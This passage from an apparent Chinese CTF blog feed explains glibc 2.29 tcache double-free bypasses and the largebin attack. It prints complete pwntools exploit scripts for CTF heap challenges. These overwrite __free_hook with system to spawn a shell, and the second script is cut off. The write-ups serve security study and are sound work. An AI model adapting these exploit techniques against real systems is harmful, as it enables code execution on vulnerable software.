we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果e-&gt;key == tcache，程序会从链表头检索chunk，如果检索到了chunk e，说明tcache中已经存在chunk e，再次释放就会触发double free。<br>这就意味着我们在2.29下就没办法用double free绕过tcache了</p><p>因此绕过想绕过检测进行double free，e-&gt;key 是入手点。</p><h3 id="绕过实现tcache-double-free思路"><a href="#绕过实现tcache-double-free思路" class="headerlink" title="绕过实现tcache double free思路"></a>绕过实现tcache double free思路</h3><blockquote><p>如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</p><p>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</p></blockquote><p>（from: <a href="https://xz.aliyun.com/t/7292#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7292#toc-2</a>)</p><h4 id="picoctf2019-zero-to-hero"><a href="#picoctf2019-zero-to-hero" class="headerlink" title="picoctf2019 zero_to_hero"></a>picoctf2019 zero_to_hero</h4><p>其实没有碰到过这类的题，就按着<a href="https://xz.aliyun.com/t/7292#toc-3" target="_blank" rel="noopener">师傅的blog</a>来讲一下这个通过改了size之后free到不同tcache队列实现double free的题吧</p><p>首先题目友好的给出了system的地址，就不需要我们leak了，我们就只需要直接用tcache操作进行改free_hook为system，执行即可</p><p>第一步先malloc两个chunk（第二个要求大于0x110）并将两个chunk free掉<br>然后malloc第一个chunk，通过off by null把第二个chunk的size 从0x1xx变成0x100<br>再free第二个chunk就可以实现double free了</p><p>接下来就是常规操作了，具体操作可以看<a href="https://xz.aliyun.com/t/7292#toc-3" target="_blank" rel="noopener">师傅的blog</a></p><h3 id="绕过tcache实现unsortedbin上操作"><a href="#绕过tcache实现unsortedbin上操作" class="headerlink" title="绕过tcache实现unsortedbin上操作"></a>绕过tcache实现unsortedbin上操作</h3><blockquote><p>tcache每一个大小的chunk个数上限是7，填满之后就会往unsortedbin里填，我们可以先将tcache填满之后再操作</p></blockquote><h4 id="ctf2019-girlfriends"><a href="#ctf2019-girlfriends" class="headerlink" title="*ctf2019 girlfriends"></a>*ctf2019 girlfriends</h4><p>这题在free的地方没清空指针，可以进行double free</p><p>step1：leak libc<br>我们可以malloc一个超过tcache大小的chunk（largebin），free完直接进入largebin，可以直接leak出libc</p><p>step2：填满tcache用fastbin构造double free</p><p>step3：通过double_free的链，将free_hook填上system。</p><p>PS: 在申请时首先清空对应tcache链上的内容，然后再申请fastbin里的chunk，<code>当tcache里没有chunk而fastbin里有chunk时，会将fastbin里的chunk放入tcache</code></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment"># # p=remote('node3.buuoj.cn',26796)</span></span><br><span class="line">pwn_file=<span class="string">"./lib/ld-2.29.so --library-path ./lib/ ./starctf_2019_girlfriend"</span></span><br><span class="line"><span class="comment">#pwn_file = "./babyheap"</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./starctf_2019_girlfriend"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF("./lib/libc.so.6")</span></span><br><span class="line">p=process(pwn_file.split())</span><br><span class="line"><span class="comment"># p=remote('node3.buuoj.cn',26796)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of girl's name"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please inpute her name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"please input her call:"</span>)</span><br><span class="line">    p.send(call)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delte</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#1</span></span><br><span class="line">delte(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3b1ca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xdf99d</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#2-8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">delte(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">delte(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache</span></span><br><span class="line">delte(<span class="number">9</span>)</span><br><span class="line">delte(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin</span></span><br><span class="line">delte(<span class="number">11</span>)</span><br><span class="line">delte(<span class="number">12</span>)</span><br><span class="line"><span class="comment"># delte(13)</span></span><br><span class="line"><span class="comment"># delte(12)</span></span><br><span class="line">delte(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>)<span class="comment">#13-19</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(free_hook),<span class="string">'coyote'</span>)<span class="comment">#20  -11</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>)<span class="comment">#21 -12</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"/bin/sh"</span>,<span class="string">"coyote"</span>) <span class="comment">#22 -11</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(system),<span class="string">'coyote'</span>) <span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">delte(<span class="number">22</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://x3h1n.github.io/2019/06/21/starctf-2019-girlfriend/" target="_blank" rel="noopener">https://x3h1n.github.io/2019/06/21/starctf-2019-girlfriend/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tcache-glibc2-27&quot;&gt;&lt;a href=&quot;#tcache-glibc2-27&quot; class=&quot;headerlink&quot; title=&quot;tcache glibc2.27&quot;&gt;&lt;/a&gt;tcache glibc2.27&lt;/h2&gt;&lt;p&gt;glibc2.27版本的tcache是可以double free处理的，利用起来就很方便&lt;/p&gt;
&lt;p&gt;tcache会把之前malloc的chunk在free完之后写入tcache list里面&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>largebin_attack-glibc2.29</title>
    <link href="https://c0yo7e.github.io/2020/08/06/largebin-attack-glibc2-29/"/>
    <id>https://c0yo7e.github.io/2020/08/06/largebin-attack-glibc2-29/</id>
    <published>2020-08-06T12:20:24.000Z</published>
    <updated>2020-08-07T07:38:06.641Z</updated>
    
    <content type="html"><![CDATA[<p>和glibc2.23版本相比，2.29的版本对unsorted bin的检查多了很多，导致unsorted bin attack几乎不可行，所以我们用largebin attack作为它的替代</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">       <span class="keyword">else</span> <span class="comment">//largebin</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck) <span class="comment">//list里面有bin</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">   &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))  <span class="comment">//小于已有所有堆块的大小</span></span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  <span class="comment">//解链，利用点1</span></span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span> <span class="comment">//大于等于列表中已有的个别堆块</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd)) <span class="comment">//找到第一个比他小的堆块</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))  <span class="comment">//两个相等，不进入</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd; </span><br><span class="line">                 <span class="keyword">else</span>  <span class="comment">//不等就插入</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; </span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//利用点2</span></span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//largebin队列为空</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>关于绕过unlink</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123; <span class="comment">//想绕过unlink就不进入这个</span></span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure><h3 id="构造的条件："><a href="#构造的条件：" class="headerlink" title="构造的条件："></a>构造的条件：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">largebin和unsortedbin中各有一个chunk;</span><br><span class="line">largebin的fd_nextsize为<span class="number">0</span>;</span><br><span class="line">largebin中的chunk-&gt;bk_nextsize可控制;</span><br><span class="line">unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure><h3 id="例题：HITCONCTF-2019-one-punch"><a href="#例题：HITCONCTF-2019-one-punch" class="headerlink" title="例题：HITCONCTF 2019 one_punch"></a>例题：HITCONCTF 2019 one_punch</h3><p>有后门函数，里面是malloc添加大小为0x217的堆块，而debuf函数是calloc，所以我们可以想到利用tcache，达到任意地址写的目的</p><p>在堆块里的第一个chunk是用来存tcache的地址的，calloc是优先在unsortedbin里取堆块的，而后门里用的malloc，可以取tcache里的堆块<br>构造fake chunk 的fd_nextsize 和 bk_nextsize  使它free完之后可以将目的地址写入unsortedbin然后通过calloc将free_hook地址写入tcache相应位置，通过后门将我们的地址写入free_hook即可</p><h4 id="方法一’s-exp"><a href="#方法一’s-exp" class="headerlink" title="方法一’s exp"></a>方法一’s exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(str(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">26976</span>)</span>:</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">"./one_punch"</span>)</span><br><span class="line"><span class="comment"># debug(0x0000000000015BB)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b *setcontext+53")</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>)) - <span class="number">0x480</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x217</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span 